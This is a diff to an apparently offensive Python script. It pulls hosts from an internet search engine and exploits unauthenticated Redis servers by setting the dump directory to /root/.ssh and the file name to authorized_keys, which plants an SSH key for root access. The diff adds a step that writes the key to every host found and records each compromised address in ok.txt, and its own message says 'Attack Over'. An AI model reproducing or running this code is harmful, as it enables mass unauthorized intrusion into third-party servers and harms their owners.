@@ -54,9 +54,11 @@ class CheckRedisStatus(object):
             conn.config_set('dir', '/root/.ssh')
             conn.config_set('dbfilename', 'authorized_keys')
             conn.save()
-            print 'Attack Over, SSH authorized_keys Write'
+            print 'Attack Over, SSH authorized_keys Write %s' % self.address
+            with open('ok.txt', 'ab') as ok:
+                ok.write(self.address)
         except:
-            print 'Something Wrong'
+            print 'Something Wrong %s' % self.address
 
 
 if __name__ == "__main__":
@@ -64,3 +66,5 @@ if __name__ == "__main__":
     for res in zoome.getHostInfo():
         rd = CheckRedisStatus(res)
         rd.verifyRedisStatus()
+        rd.write_SSH_KEY(SSH_KEY_PUB)
+
